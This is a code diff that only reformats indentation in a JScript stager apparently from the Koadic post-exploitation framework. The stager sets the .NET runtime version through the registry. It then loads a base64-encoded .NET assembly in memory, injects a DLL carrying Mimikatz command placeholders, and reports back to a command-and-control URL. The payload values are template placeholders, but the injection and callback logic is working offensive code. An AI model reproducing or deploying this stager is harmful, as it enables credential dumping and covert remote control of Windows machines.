@@ -1,15 +1,16 @@
 function setversion() {
-var shell = new ActiveXObject('WScript.Shell');
-ver = 'v4.0.30319';
-try {
-shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
-} catch(e) {
-ver = 'v2.0.50727';
+    var shell = new ActiveXObject('WScript.Shell');
+    ver = 'v4.0.30319';
+    try {
+        shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
+    } catch(e) {
+        ver = 'v2.0.50727';
+    }
+    shell.Environment('Process')('COMPLUS_Version') = ver;
 }
-shell.Environment('Process')('COMPLUS_Version') = ver;
 
-}
 function debug(s) {}
+
 function base64ToStream(b) {
 	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
 	var length = enc.GetByteCount_2(b);
@@ -128,12 +129,12 @@ try {
 	al.Add(undefined);
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
 
-  var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
-  var base64DLL = ~SHIMB64~
-  o.InjectDLL(base64DLL, shim_lpParam, ~SHIMOFFSET~);
-  Koadic.work.report("Done");
+    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
+    var base64DLL = ~SHIMB64~
+    o.InjectDLL(base64DLL, shim_lpParam, ~SHIMOFFSET~);
+    Koadic.work.report("Done");
 } catch (e) {
-  Koadic.work.error(e);
+    Koadic.work.error(e);
 }
 
 Koadic.exit();
